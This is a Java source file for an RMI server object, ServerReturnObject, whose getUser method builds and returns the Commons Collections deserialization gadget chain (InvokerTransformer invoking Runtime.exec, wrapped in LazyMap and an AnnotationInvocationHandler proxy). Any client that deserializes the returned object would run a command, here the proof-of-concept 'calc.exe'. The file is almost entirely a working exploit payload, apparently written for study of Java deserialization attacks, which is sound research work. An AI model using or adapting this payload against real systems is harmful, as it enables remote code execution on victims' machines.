import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.Serializable;  
import java.lang.annotation.Retention;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Proxy;  
import java.rmi.RemoteException;  
import java.rmi.server.UnicastRemoteObject;  
import java.util.HashMap;  
import java.util.Map;  
  
public class ServerReturnObject extends UnicastRemoteObject implements User  {  
    public String name;  
 public int age;  
  
 public ServerReturnObject(String name, int age) throws RemoteException {  
        super();  
 this.name = name;  
 this.age = age;  
 }  
  
    public Object getUser() throws Exception {  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
 new InvokerTransformer("getMethod",  
 new Class[]{String.class, Class[].class},  
 new Object[]{"getRuntime",  
 new Class[0]}),  
 new InvokerTransformer("invoke",  
 new Class[]{Object.class, Object[].class},  
 new Object[]{null, new Object[0]}),  
 new InvokerTransformer("exec",  
 new Class[]{String.class},  
 new String[]{"calc.exe"}),  
 };  
 Transformer transformerChain = new ChainedTransformer(transformers);  
 Map innerMap = new HashMap();  
 Map outerMap = LazyMap.decorate(innerMap, transformerChain);  
  
 Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);  
 construct.setAccessible(true);  
 InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);  
 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);  
 handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);  
  
  
 return (Object) handler;  
 }  
}